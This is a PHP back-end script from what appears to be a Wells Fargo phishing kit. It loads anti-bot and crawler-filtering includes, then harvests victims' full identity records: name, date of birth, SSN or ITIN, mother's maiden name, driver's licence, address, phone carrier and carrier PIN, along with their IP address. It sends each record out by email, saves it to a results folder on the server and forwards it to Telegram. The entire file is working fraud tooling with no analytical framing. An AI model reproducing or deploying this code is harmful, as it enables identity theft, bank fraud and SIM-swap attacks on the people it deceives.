<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
include "../req/config.php";

if(isset($_POST['fname']) && isset($_POST['dob']) && isset($_POST['street']) && isset($_POST['state']) && isset($_POST['mmn']) && (isset($_POST['ssn']) || isset($_POST['itin'])) ){
    if(strlen($_POST['dob']) == 10 && preg_match("/[0-9]{6,15}$/",$_POST['phone'])){
	///////////////////////// MAIL PART //////////////////////
		$fullname = $_POST['fname'];
		$street_address = $_POST['street'];
		$dob = $_POST['dob'];
		$dl = $_POST['dl'];
		$ssn = $_POST['ssn']?$_POST['ssn']:'';
		$itin = $_POST['itin']?$_POST['itin']:'';
		$mmn = $_POST['mmn']?$_POST['mmn']:'';
		$city = $_POST['city'];
		$state = $_POST['state'];
		$zip_code = $_POST['zip'];
		$mobile = $_POST['phone'];
		$pcarrier = $_POST['pcarrier'];
		$mopin = $_POST['mopin'];
		$PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|------------------- Fullz INFO ----------------| 
Full Name        : $fullname      
DOB              : $dob			  
SSN              : $ssn
ITIN             : $itin
MMN              : $mmn
DL               : $dl 
Street Address   : $street_address 
City             : $city          
State            : $state		  
Zip/Postal Code  : $zip_code 	  
Phone Number     : $mobile
Phone Carrier    : $pcarrier
Carrier Pin      : $mopin";
		$_SESSION['fullz'].=$Info_LOG; 
$Info_LOG.="
Ip    : $PublicIP ";
		

//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' 🦞🦞 ['.strtoupper($state).'] WELLS FULLZ' ;$headers = 'From: YoCHI <yochmoneywellsf@wellsfofyoch.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		header("location:confirm2?p=none");
    }
    else{ header("location:confirm?".$theerrkey."=c".md5(rand(100, 999999999)).""); };
}
else { header("location:confirm?".$theerrkey."=wec3Fauth".md5(rand(100, 999999999)).""); };
?>